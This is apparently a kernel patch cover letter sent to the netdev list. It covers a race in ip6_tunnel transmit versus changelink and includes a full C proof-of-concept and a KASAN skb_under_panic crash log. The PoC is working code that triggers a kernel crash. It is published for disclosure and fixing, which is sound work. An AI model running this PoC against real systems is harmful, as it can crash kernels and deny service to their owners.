Received: from mail-pl1-f182.google.com (mail-pl1-f182.google.com [209.85.214.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 229A734C98C
	for <netdev@vger.kernel.org>; Wed,  9 Sep 2026 19:02:04 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788980527; cv=none; b=eBhnuIJE1uS8FUSy9Nc3AE9LaM3tNg9kduw/0EuEpL9jI1RjLF3PQ2rRcMwTgOFlG2YrApvMomooOKOQHGPeIbBF2g15Ic1db0BAPSVreLvGJ46XrKFdmfhN6Gkb+Odhc+5U5kNr4841UMudl/n5drI0ULApqYkzWgfIDg1xZE0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788980527; c=relaxed/simple;
	bh=SpOtBr9ibnE5ksSj2g+UgnTuwP3lXJIjq8Tk+Lbarik=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=jf2q50tB9UZYeNMn8jkSor7q1h4pFyUJOnq+qfmjXkMhJbczj6uHpTP2ZZaGNFuIerE07oquaDcB8J6wmmnYlwc4psBycZOlfe4GEr+93Hs8IxhLqGZcHefF3MbQrQt70x4BRDeR/8pBcWrNXkMF4SaXntb4KT/Xf/J4abWuHXE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=JwJR3BiO; arc=none smtp.client-ip=209.85.214.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="JwJR3BiO"
Received: by mail-pl1-f182.google.com with SMTP id d9443c01a7336-2d6f9e2f681so69985225ad.3
        for <netdev@vger.kernel.org>; Wed, 09 Sep 2026 12:02:04 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788980524; x=1789585324; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=QwFki6eTawrQ6oBgEsQYQ5Qmad8LzwweUOqKepvY8f0=;
        b=JwJR3BiOibuEZTXd2ioYHQW1Oqy73Ba/q6UZzq1bjLmaqXTLfzlD6vYxn6juW4jE8j
         65PxhL7vwLjO/v8GhaE+NzXxPo/mKoBWVr8Mjyzl8oi+WH7bZsA70TwhFt78xjYKpxbw
         n/3RdDavmjWxcxMH9XAjL+qNOxqLj6g80s1z/FjsCiHgSe4qxqP959xRiGsjaDSqjWiV
         d9AAOrx2I9ioNBS2fY02BEmQxVPha0XQOfL548kEetetsUO/JdFq49WWpYqLYI73jlMh
         6QOH6rfyQ14jD8KOh4R3ddRi4fXc08rQEN5h6D1sWXece1FpoNdjJgXwuK1SqsuvjjZx
         HFug==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788980524; x=1789585324;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=QwFki6eTawrQ6oBgEsQYQ5Qmad8LzwweUOqKepvY8f0=;
        b=ZJ/z4Dfqik78SNm3vYvVTf9BZNjZqZ5egeCg7d68JYzFucIckQiD/zmUg7MgfqSmZW
         hjgxoMXSZzTJln6g534sDoK798QCZ42tWqmpVLsGR+3tBFO6tPH2PMhJ3XkiPcDtIqsJ
         gk6JCUxu1vdvetbXwgP9LLjFjssyLRY9XQt8p0nqN6kQrIA4cvqTASGgKE3BmRmgmHDT
         04zJar1NvJSdTCyigwS2M3Y0AMsOKMLHft2uLeYfP5keGfqZVz0qS5HEtoWkOz6yKgYA
         lsyro6TVR1IL21Q2EjeQK060GKvZAhDqRP1YRudrMzxNWh6qPZLrCPHAsGroa0BWxT8s
         Lzmw==
X-Gm-Message-State: AFuF++klqOuAjtc6phnfJgvlH2ccSrj5z4CB1oGe4J+rsgmtK1lyfP/e
	AnF60bh18Ji0dthibXiVF9/d3HACA+0Jr9VHgVWolEBh7dj+1iulBMejToH+3a63x8CkJO0suLE
	GqWIixPLj6hk=
X-Gm-Gg: AYBFou0L7EZSrXvCI7QlF92HSt2ndfwC8w4ey1RIepwsaQZUAmr+m1dga1rpWVQacEH
	yX3GSr5xgeye68CLoLEOMW32N32OREvPuCICJxMJnzUuxN43wqNb5B3D3RPdyqBkX0A/ffLom1A
	yUj5u0ftV9C+umoO0ZI0WjnxpguWOSqZCtUrbN76enEEPwUSv5nIIO2CBdH7sb5eRT7luut5Kzl
	Fwi9Djel1kPAbb8ybPhbKB+ZvwcuSh8cekwIaMsqgTmYLSaEzXqBqqZxeLr07DHySfvD0Y1HxF1
	ATTtPWbQit0DJc6a7+J+4qL+wcjEMYDZBR0TNGRMn0EJEXnINPNm6KNekRz+Kn57dbPGj54e0El
	uTtRYI2wIQU5vMyWie4VQF5loykiC4RJYdHVnXBqCblSHh3Qkrzvs/F5PCK5JP07wEMgqQqcPby
	CRTpJfR435jhbO2wQlBBaeRgk4LaSTvvl7g7PG6knC9nEuZdffVgyKmyRn2JgFQZUWUSgcIi0iV
	32X+lRPMfjocz2cKRQ=
X-Received: by 2002:a17:902:f645:b0:2d9:51db:7eaa with SMTP id d9443c01a7336-2db126797f3mr530340095ad.20.1788980521109;
        Wed, 09 Sep 2026 12:02:01 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2db1497d9ddsm77771745ad.31.2026.09.09.12.01.53
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 09 Sep 2026 12:01:59 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	tom@herbertland.com,
	vega@nebusec.ai,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net v5 0/1] ip6_tunnel: snapshot encap in xmit
Date: Thu, 10 Sep 2026 03:01:14 +0800
Message-ID: <cover.1788778433.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv6/ip6_tunnel.c. The bug is
reachable when an IPv6 tunnel changelink operation races with packet
transmission in a network namespace.

The patch makes each transmitted packet use one field-wise local
encapsulation copy. The focused build passes and the KASAN kernel boots
without a KASAN report, skb_under_panic(), oops, or panic.

The PoC setup in the current QEMU environment does not complete the
intended netlink configuration update. Its check-only mode returns
EINVAL, and race-only reports mutated=no, so those results are not counted
as a successful race validation.

We will provide detailed information about the bug in this email,
along with a PoC to trigger it.

---

Changes in v5:

v4: https://lore.kernel.org/cover.1788262122.git.petalzu987@gmail.com/

- Remove the clearing memset() from ip6_tnl_encap_setup() so a failed hlen
  check leaves the previous valid configuration in place.
- Publish all four encapsulation fields with WRITE_ONCE().
- Clarify that the four READ_ONCE() operations do not form an atomic
  changelink snapshot.
- Keep the shared helper and the existing t->hlen adjustment logic
  unchanged.

Changes in v4:

v3: https://lore.kernel.org/cover.1787499036.git.petalzu987@gmail.com/

- Address Sashiko's review by introducing a shared
        ip_tunnel_encap_snapshot() helper in ip_tunnels.h and using it in
        ip6_tnl_xmit() instead of a transmit-side data_race() struct copy.
- Keep the v3 transmit-side fix shape otherwise unchanged, including
  no change to the needed_headroom adjustment logic.

Changes in v3:

v2: https://lore.kernel.org/cover.1786088695.git.petalzu987@gmail.com/

- Rebase to latest net/main and rerun baseline/fixed QEMU validation.
- Keep the v2 packet-local encapsulation snapshot fix unchanged.

Changes in v2:

v1: https://lore.kernel.org/cover.1785221754.git.petalzu987@gmail.com/

- Replace TX queue quiescing and synchronize_net() with a packet-local
        encapsulation snapshot in ip6_tnl_xmit().
- Use the same snapshot for encapsulation length, metadata validation,
        headroom accounting, and header construction.
- Avoid noqueue packet drops and changes to pre-existing TX queue state.
- Remove the temporary tunnel object and the redundant hlen update.
- Cover ip6tnl and IPv6 GRE-family users of the shared transmit path.
- Leave separate control-plane transactional and IPv4 tunnel issues for
        follow-up work.
- Update the subject to describe the new xmit-side fix.

---- details below ----

Bug details:

ip6_tnl_changelink() can change encapsulation parameters while the tunnel
device is still accepting transmitters. A racing transmitter can reserve
headroom using the old encapsulation state, then build the packet after the
live encapsulation state has changed. This can underflow the skb head and
trigger skb_under_panic() from skb_push().

The patch takes a field-wise local copy of t->encap in ip6_tnl_xmit()
before calculating the encapsulation header length. Headroom accounting,
metadata validation, and build_header() all use that same local object, so
one skb does not re-read the live configuration after the headroom check.

The copy is deliberately not described as an atomic snapshot. type, flags,
sport, and dport are read independently with READ_ONCE(), so a concurrent
update can be observed at different points during the copy. The local copy
still gives all encapsulation decisions for that skb one consistent local
input after the copy.

The writer validates the new encapsulation length before publishing the
fields, removes the clearing memset(), and uses WRITE_ONCE() for each
field.
An invalid update therefore leaves the previous valid configuration in
place. The shared helper remains in ip_tunnels.h, and the t->hlen
needed_headroom adjustment remains unchanged.

Reproducer:

    make
    ./poc --check-only
    ./poc --race-only --iters 200 --threads 8 --runtime-ms 20

The PoC is run in a 2 vCPU, 1 GB x86 QEMU environment with KASAN. It
changes the encapsulation parameters while packets are transmitted.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_link.h>
#include <linux/if_tunnel.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef IFLA_INFO_KIND
#define IFLA_INFO_KIND 1
#define IFLA_INFO_DATA 2
#endif

#define NL_BUF_SIZE 4096
#define DEFAULT_ITERS 4000
#define DEFAULT_THREADS 4
#define DEFAULT_RUNTIME_MS 150

struct req {
  struct nlmsghdr nlh;
  struct ifinfomsg ifm;
  char buf[NL_BUF_SIZE];
};

struct thread_arg {
  int ifindex;
  int cpu;
  volatile sig_atomic_t *stop;
  unsigned long packets;
  unsigned long errors;
};

static const char *tnl_name = "poc6tnl0";
static const char *dummy_name = "dummy0";
static const char *local_addr = "fec0::1";
static const char *remote_addr = "fec0::1234";
static const char *inner_local4 = "10.23.0.1";
static const char *inner_remote4 = "10.23.0.2";
static int race_threads = DEFAULT_THREADS;
static int race_iterations = DEFAULT_ITERS;
static int race_runtime_ms = DEFAULT_RUNTIME_MS;
static bool run_check = true;
static bool run_race = true;

static void die(const char *msg)
{
  perror(msg);
  exit(1);
}

static void addattr_l(struct nlmsghdr *n, size_t maxlen, int type,
            const void *data, size_t alen)
{
  size_t len = RTA_LENGTH(alen);
  size_t total = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
  struct rtattr *rta;

  if (total > maxlen) {
    fprintf(stderr, "netlink attribute buffer too small\n");
    exit(1);
  }

  rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
  rta->rta_type = type;
  rta->rta_len = len;
  if (alen)
    memcpy(RTA_DATA(rta), data, alen);
  n->nlmsg_len = total;
}

static struct rtattr *nest_start(struct nlmsghdr *n, size_t maxlen, int type)
{
  struct rtattr *start;

  start = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));
  addattr_l(n, maxlen, type, NULL, 0);
  return start;
}

static void nest_end(struct nlmsghdr *n, struct rtattr *start)
{
  start->rta_len = (char *)n + n->nlmsg_len - (char *)start;
}

static int run_cmd(const char *cmd)
{
  int ret = system(cmd);
  int status;

  if (ret == -1)
    die("system");
  status = WIFEXITED(ret) ? WEXITSTATUS(ret) : 128 + WTERMSIG(ret);
  if (status)
    fprintf(stderr, "command failed (status=%d): %s\n", status, cmd);
  return status;
}

static int get_ifindex(const char *name)
{
  struct ifreq ifr;
  int fd;

  memset(&ifr, 0, sizeof(ifr));
  snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", name);

  fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0)
    die("socket(AF_INET)");
  if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
    die("ioctl(SIOCGIFINDEX)");
  close(fd);

  return ifr.ifr_ifindex;
}

static int nl_open(void)
{
  int fd;

  fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  if (fd < 0)
    die("socket(AF_NETLINK)");

  return fd;
}

static int nl_talk_fd(int fd, struct nlmsghdr *nlh)
{
  struct sockaddr_nl nladdr = {
    .nl_family = AF_NETLINK,
  };
  char resp[NL_BUF_SIZE];
  struct iovec iov = {
    .iov_base = nlh,
    .iov_len = nlh->nlmsg_len,
  };
  struct msghdr msg = {
    .msg_name = &nladdr,
    .msg_namelen = sizeof(nladdr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
  };
  struct nlmsghdr *reply;
  struct nlmsgerr *err;
  ssize_t len;

  if (sendmsg(fd, &msg, 0) < 0)
    die("sendmsg");

  iov.iov_base = resp;
  iov.iov_len = sizeof(resp);
  len = recvmsg(fd, &msg, 0);
  if (len < 0)
    die("recvmsg");

  reply = (struct nlmsghdr *)resp;
  if (!NLMSG_OK(reply, len) || reply->nlmsg_type != NLMSG_ERROR) {
    fprintf(stderr, "unexpected netlink reply type %u\n", reply->nlmsg_type);
    return -1;
  }

  err = NLMSG_DATA(reply);
  return err->error;
}

static void build_invalid_setlink_req(struct req *req, int ifindex,
                uint16_t dport)
{
  struct rtattr *linkinfo;
  struct rtattr *infodata;
  const char kind[] = "ip6tnl";
  uint16_t encap_type = TUNNEL_ENCAP_GUE;
  uint16_t encap_flags = TUNNEL_ENCAP_FLAG_REMCSUM;
  uint16_t encap_dport = htons(dport);

  memset(req, 0, sizeof(*req));
  req->nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req->ifm));
  req->nlh.nlmsg_type = RTM_NEWLINK;
  req->nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  req->ifm.ifi_family = AF_UNSPEC;
  req->ifm.ifi_index = ifindex;

  linkinfo = nest_start(&req->nlh, sizeof(*req), IFLA_LINKINFO);
  addattr_l(&req->nlh, sizeof(*req), IFLA_INFO_KIND, kind, sizeof(kind));
  infodata = nest_start(&req->nlh, sizeof(*req), IFLA_INFO_DATA);
  addattr_l(&req->nlh, sizeof(*req), IFLA_IPTUN_ENCAP_TYPE,
      &encap_type, sizeof(encap_type));
  addattr_l(&req->nlh, sizeof(*req), IFLA_IPTUN_ENCAP_FLAGS,
      &encap_flags, sizeof(encap_flags));
  addattr_l(&req->nlh, sizeof(*req), IFLA_IPTUN_ENCAP_DPORT,
      &encap_dport, sizeof(encap_dport));
  addattr_l(&req->nlh, sizeof(*req), IFLA_IPTUN_COLLECT_METADATA, NULL, 0);
  nest_end(&req->nlh, infodata);
  nest_end(&req->nlh, linkinfo);
}

static int send_invalid_setlink(int ifindex, uint16_t dport)
{
  struct req req;
  int fd;
  int err;

  build_invalid_setlink_req(&req, ifindex, dport);
  fd = nl_open();
  err = nl_talk_fd(fd, &req.nlh);
  close(fd);

  return err;
}

static int setup_outer(void)
{
  char cmd[1024];

  snprintf(cmd, sizeof(cmd),
     "ip link add %s type dummy 2>/dev/null || true; "
     "ip link set %s up; "
     "ip -6 addr replace %s/64 dev %s",
     dummy_name, dummy_name, local_addr, dummy_name);
  return run_cmd(cmd);
}

static int create_ip6tnl_link(void)
{
  struct req req;
  struct rtattr *linkinfo;
  struct rtattr *infodata;
  struct in6_addr local;
  struct in6_addr remote;
  const char kind[] = "ip6tnl";
  uint8_t proto = IPPROTO_IPIP;
  int link = get_ifindex(dummy_name);
  int fd;
  int err;

  if (inet_pton(AF_INET6, local_addr, &local) != 1 ||
    inet_pton(AF_INET6, remote_addr, &remote) != 1)
    die("inet_pton(AF_INET6)");

  memset(&req, 0, sizeof(req));
  req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.ifm));
  req.nlh.nlmsg_type = RTM_NEWLINK;
  req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
            NLM_F_CREATE | NLM_F_EXCL;
  req.ifm.ifi_family = AF_UNSPEC;
  addattr_l(&req.nlh, sizeof(req), IFLA_IFNAME, tnl_name,
        strlen(tnl_name) + 1);

  linkinfo = nest_start(&req.nlh, sizeof(req), IFLA_LINKINFO);
  addattr_l(&req.nlh, sizeof(req), IFLA_INFO_KIND, kind, sizeof(kind));
  infodata = nest_start(&req.nlh, sizeof(req), IFLA_INFO_DATA);
  addattr_l(&req.nlh, sizeof(req), IFLA_IPTUN_LINK, &link, sizeof(link));
  addattr_l(&req.nlh, sizeof(req), IFLA_IPTUN_LOCAL, &local, sizeof(local));
  addattr_l(&req.nlh, sizeof(req), IFLA_IPTUN_REMOTE, &remote,
        sizeof(remote));
  addattr_l(&req.nlh, sizeof(req), IFLA_IPTUN_PROTO, &proto, sizeof(proto));
  nest_end(&req.nlh, infodata);
  nest_end(&req.nlh, linkinfo);

  fd = nl_open();
  err = nl_talk_fd(fd, &req.nlh);
  close(fd);
  return err;
}

static int cleanup_tunnel(void)
{
  char cmd[256];

  snprintf(cmd, sizeof(cmd), "ip link del %s 2>/dev/null || true", tnl_name);
  return run_cmd(cmd);
}

static int create_tunnel(void)
{
  char cmd[512];
  int err;

  err = create_ip6tnl_link();
  if (err) {
    fprintf(stderr, "RTM_NEWLINK ip6tnl failed: %d (%s)\n", err,
      strerror(-err));
    return 1;
  }

  snprintf(cmd, sizeof(cmd),
     "ip addr replace %s peer %s dev %s && ip link set %s up",
     inner_local4, inner_remote4, tnl_name, tnl_name);
  return run_cmd(cmd);
}

static bool tunnel_mutated(void)
{
  char cmd[512];
  FILE *fp;
  char buf[4096];
  bool mutated = false;

  snprintf(cmd, sizeof(cmd), "ip -d link show dev %s 2>/dev/null", tnl_name);
  fp = popen(cmd, "r");
  if (!fp)
    die("popen(ip link show)");

  while (fgets(buf, sizeof(buf), fp)) {
    if (strstr(buf, "encap gue") && strstr(buf, "encap-remcsum"))
      mutated = true;
  }

  pclose(fp);
  return mutated;
}

static void pin_to_cpu(int cpu)
{
  cpu_set_t set;

  if (cpu < 0)
    return;

  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  (void)pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
}

static void *sender_thread(void *arg)
{
  struct thread_arg *targ = arg;
  struct sockaddr_in sin = {
    .sin_family = AF_INET,
    .sin_port = htons(9),
  };
  uint8_t pkt[128];
  int fd;

  pin_to_cpu(targ->cpu);

  fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0)
    die("socket(AF_INET)");

  if (inet_pton(AF_INET, inner_remote4, &sin.sin_addr) != 1)
    die("inet_pton(AF_INET)");
  memset(pkt, 0x41, sizeof(pkt));

  while (!*targ->stop) {
    if (sendto(fd, pkt, sizeof(pkt), 0,
         (struct sockaddr *)&sin, sizeof(sin)) < 0) {
      targ->errors++;
      if (errno == ENETDOWN || errno == ENODEV ||
          errno == ENETUNREACH)
        break;
    } else {
      targ->packets++;
    }
  }

  close(fd);
  return NULL;
}

static int run_check_mode(void)
{
  int ifindex;
  int err;
  bool mutated;

  if (setup_outer())
    return 1;
  cleanup_tunnel();
  if (create_tunnel())
    return 1;

  ifindex = get_ifindex(tnl_name);
  err = send_invalid_setlink(ifindex, 5555);
  mutated = tunnel_mutated();

  printf("[check] netlink_error=%d (%s)\n", err,
         err ? strerror(-err) : "success");
  printf("[check] mutated=%s\n", mutated ? "yes" : "no");

  return (err == -EINVAL && mutated) ? 0 : 1;
}

static int run_race_mode(void)
{
  int iter;

  for (iter = 0; iter < race_iterations; iter++) {
    pthread_t tids[64];
    struct thread_arg args[64];
    volatile sig_atomic_t stop = 0;
    struct timespec ts;
    int ifindex;
    int i;
    int err;
    unsigned long sent = 0;
    unsigned long failed = 0;

    if (race_threads > (int)(sizeof(tids) / sizeof(tids[0]))) {
      fprintf(stderr, "too many threads requested\n");
      return 1;
    }

    cleanup_tunnel();
    if (create_tunnel())
      return 1;
    ifindex = get_ifindex(tnl_name);

    for (i = 0; i < race_threads; i++) {
      args[i].ifindex = ifindex;
      args[i].cpu = i % 4;
      args[i].stop = &stop;
      args[i].packets = 0;
      args[i].errors = 0;
      if (pthread_create(&tids[i], NULL, sender_thread, &args[i])) {
        perror("pthread_create");
        stop = 1;
        for (i--; i >= 0; i--)
          pthread_join(tids[i], NULL);
        return 1;
      }
    }

    ts.tv_sec = 0;
    ts.tv_nsec = 20 * 1000 * 1000;
    nanosleep(&ts, NULL);

    err = send_invalid_setlink(ifindex, (uint16_t)(6000 + (iter % 512)));

    ts.tv_sec = race_runtime_ms / 1000;
    ts.tv_nsec = (race_runtime_ms % 1000) * 1000 * 1000L;
    nanosleep(&ts, NULL);
    stop = 1;

    for (i = 0; i < race_threads; i++) {
      pthread_join(tids[i], NULL);
      sent += args[i].packets;
      failed += args[i].errors;
    }

    if ((iter % 100) == 0 || err != -EINVAL) {
      printf("[race] iter=%d send_err=%d mutated=%s packets=%lu errors=%lu\n",
             iter, err, tunnel_mutated() ? "yes" : "no", sent, failed);
      fflush(stdout);
    }
  }

  return 0;
}

static void usage(const char *prog)
{
  fprintf(stderr,
    "usage: %s [--check-only] [--race-only] [--iters N] [--threads N] [--runtime-ms N]\n",
    prog);
  exit(1);
}

static void parse_args(int argc, char **argv)
{
  int i;

  for (i = 1; i < argc; i++) {
    if (!strcmp(argv[i], "--check-only")) {
      run_check = true;
      run_race = false;
    } else if (!strcmp(argv[i], "--race-only")) {
      run_check = false;
      run_race = true;
    } else if (!strcmp(argv[i], "--iters") && i + 1 < argc) {
      race_iterations = atoi(argv[++i]);
    } else if (!strcmp(argv[i], "--threads") && i + 1 < argc) {
      race_threads = atoi(argv[++i]);
    } else if (!strcmp(argv[i], "--runtime-ms") && i + 1 < argc) {
      race_runtime_ms = atoi(argv[++i]);
    } else {
      usage(argv[0]);
    }
  }

  if (race_threads <= 0 || race_threads > 64 ||
      race_iterations <= 0 || race_runtime_ms <= 0)
    usage(argv[0]);
}

int main(int argc, char **argv)
{
  int ret = 0;

  parse_args(argc, argv);

  if (run_check)
    ret |= run_check_mode();

  if (run_race)
    ret |= run_race_mode();

  return ret;
}
------END poc.c---------

----BEGIN historical baseline crash log (v4)----

The following log is retained from v4 to document the original failure.
The v5 QEMU run is reported separately below because the current PoC setup
does not complete the netlink configuration update.

[baseline] starting PoC check
[    2.565456] ip (72) used greatest stack depth: 27344 bytes left
[    2.566217] ip (69) used greatest stack depth: 27200 bytes left
[    2.570919] ip (78) used greatest stack depth: 26920 bytes left
[check] netlink_error=-22 (Invalid argument)
[check] mutated=no
[    2.577014] poc (68) used greatest stack depth: 26248 bytes left
[baseline] check exit=1
[baseline] starting PoC race
[    2.589639] ip (82) used greatest stack depth: 24760 bytes left
[race] iter=0 send_err=-22 mutated=no packets=4079 errors=0
[    2.848104] input: ImExPS/2 Generic Explorer Mouse as
/devices/platform/i8042/serio1/input/input3
[    4.844972] skbuff: skb_under_panic: text:ffffffffb759b61c len:224
put:40 head:ffff8880050e3a80 data:ffff8880050e3a7c tail:0xdc end:0x180
dev:poc6tnl0
[    4.847654] ------------[ cut here ]------------
[    4.848645] kernel BUG at net/core/skbuff.c:214!
[    4.849571] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[    4.850653] CPU: 1 UID: 0 PID: 561 Comm: poc Not tainted
7.2.0-rc4-00359-g78f75d632f74 #1 PREEMPT(lazy)
[    4.852421] Hardware name: QEMU Standard PC (i440FX + PIIX), BIOS
1.15.0-1 04/01/2014
[    4.853990] RIP: 0010:skb_panic+0xbe/0xc0
[    4.854631] Code: ff 8b 4b 70 48 c7 c7 60 0e f6 b7 41 56 4d 89 f9
41 55 41 54 55 44 8b 44 24 34 48 8b 54 24 28 48 8b 74 24 20 e8 33 ab
d5 fe 90 <0f> 0b 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3
0f 1e fa
[    4.856913] RSP: 0018:ffffc900012c71c0 EFLAGS: 00010246
[    4.857544] RAX: 000000000000008a RBX: ffff888003313000
RCX: ffffffffb5ed8b55
[    4.858392] RDX: 0000000000000000 RSI: 0000000000000004
RDI: 0000000000000001
[    4.859248] RBP: ffff8880050e3a7c R08: 0000000000000000
R09: fffffbfff711a524
[    4.860119] R10: 0000000000000003 R11: 203a666675626b73
R12: 00000000000000dc
[    4.860997] R13: 0000000000000180 R14: ffff888002c18120
R15: ffff8880050e3a80
[    4.861859] FS:  00007f3b9a1d0640(0000) GS:ffff88807c2d5000(0000)
knlGS:0000000000000000
[    4.862846] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.863601] CR2: 00000000006167e0 CR3: 000000000414e001
CR4: 0000000000370ef0
[    4.864477] Call Trace:
[    4.864808]  <TASK>
[    4.865088]  ? ip6_tnl_xmit+0xa2c/0x12d0
[    4.865591]  ? ip6_tnl_xmit+0xa2c/0x12d0
[    4.866076]  skb_push+0x7b/0x80
[    4.866493]  ip6_tnl_xmit+0xa2c/0x12d0
[    4.866984]  ? __pfx_ip6_tnl_xmit+0x10/0x10
[    4.867497]  ? ip_make_skb+0x1e1/0x220
[    4.867974]  ? udp_sendmsg+0xadc/0xf60
[    4.869036]  ? __x64_sys_sendto+0x71/0x90
[    4.869549]  ? do_syscall_64+0x102/0x5a0
[    4.870054]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    4.870704]  ip6_tnl_start_xmit+0x5a1/0x900
[    4.871238]  ? __pfx_ip6_tnl_start_xmit+0x10/0x10
[    4.871841]  ? netif_skb_features+0x48a/0x7d0
[    4.872437]  ? kasan_save_track+0x14/0x30
[    4.872949]  dev_hard_start_xmit+0x84/0x300
[    4.873464]  __dev_queue_xmit+0x891/0x1a50
[    4.873967]  ? __pfx___alloc_skb+0x10/0x10
[    4.874472]  ? selinux_ip_postroute_compat+0x271/0x290
[    4.875110]  ? __pfx___dev_queue_xmit+0x10/0x10
[    4.875679]  ? __pfx_selinux_ip_postroute_compat+0x10/0x10
[    4.876366]  ? skb_complete_wifi_ack+0x1e1/0x1f0
[    4.876963]  ? __pfx__copy_from_iter+0x10/0x10
[    4.877513]  ? pick_eevdf+0xd9/0x330
[    4.877976]  ? __pfx_selinux_ip_postroute+0x10/0x10
[    4.878584]  ? selinux_ip_postroute+0x31d/0x5f0
[    4.879141]  ? neigh_connected_output+0x169/0x1d0
[    4.879716]  ip_finish_output2+0x2e6/0x9b0
[    4.880271]  ? __ip_append_data+0x15bf/0x1b50
[    4.880824]  ? __pfx_ip_finish_output2+0x10/0x10
[    4.881392]  __ip_finish_output.part.0+0x256/0x3f0
[    4.881978]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    4.882659]  ? __pfx_selinux_ip_postroute+0x10/0x10
[    4.883254]  ? nf_hook_slow+0x77/0x110
[    4.883741]  ip_output+0x19e/0x280
[    4.884192]  ? __pfx_ip_output+0x10/0x10
[    4.884859]  ? __pfx_ip_finish_output+0x10/0x10
[    4.885416]  ? __pfx_ip_make_skb+0x10/0x10
[    4.885914]  ip_send_skb+0xbf/0xd0
[    4.886361]  udp_send_skb+0x31b/0x4c0
[    4.886848]  udp_sendmsg+0xb16/0xf60
[    4.887295]  ? __pfx_udp_sendmsg+0x10/0x10
[    4.887794]  ? vruntime_eligible+0xdd/0x100
[    4.888349]  ? selinux_socket_sendmsg+0x5c/0x100
[    4.888941]  ? inet_send_prepare+0x18/0x110
[    4.889455]  __sys_sendto+0x28d/0x2b0
[    4.889910]  ? __pfx___sys_sendto+0x10/0x10
[    4.890430]  ? finish_task_switch.isra.0+0x16e/0x510
[    4.891033]  ? xfd_validate_state+0x28/0xb0
[    4.891543]  __x64_sys_sendto+0x71/0x90
[    4.892029]  do_syscall_64+0x102/0x5a0
[    4.892543]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    4.893179] RIP: 0033:0x4528a6
[    4.893569] Code: 85 02 00 44 8b 4c 24 2c 4c 8b 44 24 20 41 89 c4
44 8b 54 24 28 48 8b 54 24 18 b8 2c 00 00 00 48 8b 74 24 10 8b 7c 24
08 0f 05 <48> 3d 00 f0 ff ff 77 3a 44 89 e7 48 89 44 24 08 e8 85 85
02 00 48
[    4.895726] RSP: 002b:00007f3b9a1d0050 EFLAGS: 00000293
ORIG_RAX: 000000000000002c
[    4.896680] RAX: ffffffffffffffda RBX: 00007fff3ca0b700
RCX: 00000000004528a6
[    4.897536] RDX: 0000000000000080 RSI: 00007f3b9a1d0120
RDI: 000000000000000a
